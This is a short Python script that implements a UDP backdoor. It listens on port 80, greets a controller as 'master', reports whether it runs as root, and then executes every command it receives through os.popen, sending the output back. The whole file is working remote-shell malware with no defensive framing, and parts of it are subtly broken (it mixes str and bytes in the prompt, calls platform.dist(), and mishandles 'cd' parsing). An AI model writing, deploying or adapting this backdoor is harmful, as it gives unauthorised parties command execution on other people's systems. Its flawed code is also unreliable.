#!/usr/bin/python

import socket
import os
import sys
import platform

def launch():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(("", 80))
    launch = s.recvfrom(1024)
    addr = launch[1][0]
    port = launch[1][1]
    s.sendto(b'hello master', (addr, port))
    return s, addr, port

s, addr, port = launch()

def getsysinfo():
    que = s.recvfrom(1024)
    prompt = []
    if que[1][0] == addr and que[1][1] == port:
        if os.getuid() == 0:
            prompt.append(b'root@')
            prompt.append(b'# ')
        else:
            prompt.append(b'user@')
            prompt.append(b'$ ')
        prompt.append(platform.dist()[0])
        s.sendto(b''.join(prompt), (addr, port))
        return

getsysinfo()

def shell():
    while 1:
        try:
            command = s.recv(1024)
            if command.strip().split()[0] == b'cd':
                os.chdir(command.strip(b'cd '))
                s.sendto(b'Changed Directory', (addr, port))
            elif command.strip() == b'goodbye':
                s.sendto(b'Goodbye master', (addr, port))
                s.close()
                break
            else:
                proc = os.popen(command.decode())
                output = b''
                for i in proc.readlines():
                    output += i.encode()
                output = output.strip()
                s.sendto(output, (addr, port))
        except Exception:
            s.sendto(b'An unexpected error has occurred', (addr, port))
            pass

shell()
